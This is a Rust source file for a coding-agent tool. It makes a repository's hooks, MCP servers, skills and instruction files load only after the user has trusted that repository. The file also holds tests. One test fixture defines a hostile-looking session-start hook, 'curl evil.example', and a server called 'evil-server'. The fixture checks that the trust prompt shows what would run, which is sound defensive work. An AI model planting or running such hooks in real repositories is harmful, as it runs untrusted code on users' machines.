//! Whether to load what a repository ships, and `anvil trust`.
//!
//! A repository can ship hooks and MCP servers, which run programs, and
//! skills, slash commands, agents and instruction files, which steer the
//! model. None of them load until the user has trusted the repository. The
//! user is asked once, with the full list in front of them, and the answer
//! is kept in `~/.anvil/trust.toml`. Without a terminal to ask on, an
//! undecided repository is treated as untrusted, never as trusted.

use std::collections::BTreeSet;
use std::io::{BufRead, Write};
use std::path::Path;

use anvil_compat::mcp::Transport;
use anvil_compat::{AgentSet, CommandSet, HookConfig, Origin, ServerSet, SkillRoots, SkillSet};
use anvil_core::context::discover_instructions;
use anvil_types::trust::{TrustDecision, TrustStore};
use anyhow::Context;

/// The line shown under the list, for instruction files found only later.
const NESTED_NOTE: &str =
    "and any CLAUDE.md in a subfolder, once the session reads a file in that folder";

/// One line per thing the repository ships that anvil would load if trusted.
///
/// # Arguments
///
/// * `root` - The repository root.
///
/// # Returns
///
/// The lines, empty when the repository ships nothing anvil would load.
pub fn shipped(root: &Path) -> Vec<String> {
    let mut items = Vec::new();
    let base = discover_instructions(None, Some(root), &BTreeSet::new());
    let extra = anvil_compat::instructions::discover_extra(None, Some(root), &base);
    for instruction in base.iter().chain(&extra) {
        items.push(format!("instructions: {}", instruction.source));
    }
    let skills = SkillSet::discover(&SkillRoots {
        project: Some(root.to_path_buf()),
        home: None,
        bundled: None,
    });
    for skill in skills.skills() {
        items.push(format!("skill {}: {}", skill.name(), skill.dir.display()));
    }
    for command in CommandSet::discover(Some(root), None).commands() {
        items.push(format!(
            "command /{}: {}",
            command.name,
            command.path.display()
        ));
    }
    for agent in AgentSet::discover(Some(root), None).agents() {
        if agent.origin != Origin::Bundled {
            items.push(format!("agent {}: {}", agent.name, agent.path.display()));
        }
    }
    let hooks = HookConfig::load(Some(root), None);
    for event in hooks.events() {
        for group in hooks.groups(event) {
            for command in &group.commands {
                items.push(format!(
                    "hook {event}: runs `{}` ({})",
                    command.command,
                    group.source.display()
                ));
            }
        }
    }
    for server in ServerSet::load(Some(root), None).servers() {
        let Transport::Stdio { command, args, .. } = &server.transport;
        items.push(format!(
            "MCP server {}: starts `{}` ({})",
            server.name,
            format!("{command} {}", args.join(" ")).trim_end(),
            server.source.display()
        ));
    }
    items
}

/// Decides whether the repository's shipped files load in this run.
///
/// A stored decision is used as it is. Otherwise, when `ask` is true and
/// the repository ships something, the user is asked once and the answer
/// is stored. When `ask` is false (plain output, `--yes`, no terminal, or a
/// command that never prompts) an undecided repository stays untrusted and
/// one line says how to review it.
///
/// # Arguments
///
/// * `root` - The repository root.
/// * `home` - The home directory, where decisions are kept.
/// * `ask` - Whether a person is at the terminal to answer.
///
/// # Returns
///
/// Whether the repository is trusted.
///
/// # Errors
///
/// When `~/.anvil/trust.toml` cannot be read or parsed, or the answer
/// cannot be saved.
pub fn decide(root: &Path, home: Option<&Path>, ask: bool) -> anyhow::Result<bool> {
    let Some(home) = home else {
        return Ok(false);
    };
    let mut store = TrustStore::load(home)?;
    match store.decision(root) {
        Some(TrustDecision::Trusted) => return Ok(true),
        Some(TrustDecision::Untrusted) => return Ok(false),
        None => {}
    }
    let items = shipped(root);
    if items.is_empty() {
        return Ok(false);
    }
    if !ask {
        eprintln!(
            "note: this repository ships {} item(s) that anvil does not load until you trust it; run `anvil trust` to review them",
            items.len()
        );
        return Ok(false);
    }
    let trusted = ask_on_terminal(root, &items)?;
    record(&mut store, home, root, trusted)?;
    Ok(trusted)
}

/// `anvil trust`: shows what the repository ships and asks, or with
/// `revoke` records it as untrusted without asking.
///
/// # Arguments
///
/// * `root` - The repository root.
/// * `home` - The home directory.
/// * `revoke` - Record the repository as untrusted.
///
/// # Returns
///
/// The process exit code: zero.
///
/// # Errors
///
/// When the home directory is unknown or the trust file cannot be read or
/// written.
pub fn run(root: &Path, home: Option<&Path>, revoke: bool) -> anyhow::Result<i32> {
    let home = home.context("cannot determine the home directory to keep the decision in")?;
    let mut store = TrustStore::load(home)?;
    if revoke {
        record(&mut store, home, root, false)?;
        return Ok(0);
    }
    let items = shipped(root);
    if items.is_empty() {
        println!(
            "{} ships no hooks, MCP servers, skills, commands, agents or instruction files.",
            root.display()
        );
    }
    let trusted = ask_on_terminal(root, &items)?;
    record(&mut store, home, root, trusted)?;
    Ok(0)
}

/// Stores the decision and says where.
fn record(store: &mut TrustStore, home: &Path, root: &Path, trusted: bool) -> anyhow::Result<()> {
    let decision = if trusted {
        TrustDecision::Trusted
    } else {
        TrustDecision::Untrusted
    };
    store.set(root, decision);
    let path = store.save(home).context("saving the trust decision")?;
    let word = if trusted { "trusted" } else { "not trusted" };
    eprintln!("{} is {word}; saved in {}", root.display(), path.display());
    Ok(())
}

/// Lists the items on stderr and reads a yes or no from stdin; anything
/// but `y` or `yes`, end of input included, is no.
fn ask_on_terminal(root: &Path, items: &[String]) -> anyhow::Result<bool> {
    let mut err = std::io::stderr().lock();
    writeln!(
        err,
        "{} ships files that run programs or steer the model:",
        root.display()
    )?;
    for item in items {
        writeln!(err, "  - {item}")?;
    }
    writeln!(err, "  - {NESTED_NOTE}")?;
    writeln!(
        err,
        "anvil loads them only if you trust this repository. Hooks and MCP servers run with your own rights."
    )?;
    write!(err, "Trust this repository? [y/N] ")?;
    err.flush()?;
    let mut answer = String::new();
    std::io::stdin().lock().read_line(&mut answer)?;
    Ok(matches!(
        answer.trim().to_ascii_lowercase().as_str(),
        "y" | "yes"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(root: &Path, relative: &str, text: &str) {
        let path = root.join(relative);
        std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
        std::fs::write(path, text).expect("write");
    }

    #[test]
    fn an_empty_repository_ships_nothing() {
        let root = tempfile::tempdir().expect("root");
        assert!(shipped(root.path()).is_empty());
    }

    #[test]
    fn every_kind_of_shipped_file_is_listed_with_what_it_runs() {
        let root = tempfile::tempdir().expect("root");
        write(root.path(), "CLAUDE.md", "rules");
        write(
            root.path(),
            ".claude/skills/s/SKILL.md",
            "---\nname: s\ndescription: d\n---\nbody\n",
        );
        write(root.path(), ".claude/commands/go.md", "do it");
        write(
            root.path(),
            ".claude/agents/a.md",
            "---\nname: a\ndescription: d\n---\nbody\n",
        );
        write(
            root.path(),
            ".claude/settings.json",
            r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl evil.example"}]}]}}"#,
        );
        write(
            root.path(),
            ".mcp.json",
            r#"{"mcpServers": {"x": {"command": "evil-server", "args": ["--all"]}}}"#,
        );
        let items = shipped(root.path()).join("\n");
        for expected in [
            "instructions: CLAUDE.md",
            "skill s:",
            "command /go:",
            "agent a:",
            "runs `curl evil.example`",
            "starts `evil-server --all`",
        ] {
            assert!(items.contains(expected), "{expected} missing in:\n{items}");
        }
    }

    #[test]
    fn without_a_terminal_an_undecided_repository_is_not_trusted_or_recorded() {
        let root = tempfile::tempdir().expect("root");
        let home = tempfile::tempdir().expect("home");
        write(root.path(), "CLAUDE.md", "rules");
        assert!(!decide(root.path(), Some(home.path()), false).expect("decides"));
        let store = TrustStore::load(home.path()).expect("loads");
        assert_eq!(store.decision(root.path()), None, "nothing recorded");
    }

    #[test]
    fn a_stored_decision_is_used_without_asking() {
        let root = tempfile::tempdir().expect("root");
        let home = tempfile::tempdir().expect("home");
        write(root.path(), "CLAUDE.md", "rules");
        let mut store = TrustStore::default();
        store.set(root.path(), TrustDecision::Trusted);
        store.save(home.path()).expect("saves");
        assert!(decide(root.path(), Some(home.path()), false).expect("decides"));
        store.set(root.path(), TrustDecision::Untrusted);
        store.save(home.path()).expect("saves");
        assert!(!decide(root.path(), Some(home.path()), true).expect("decides"));
    }
}
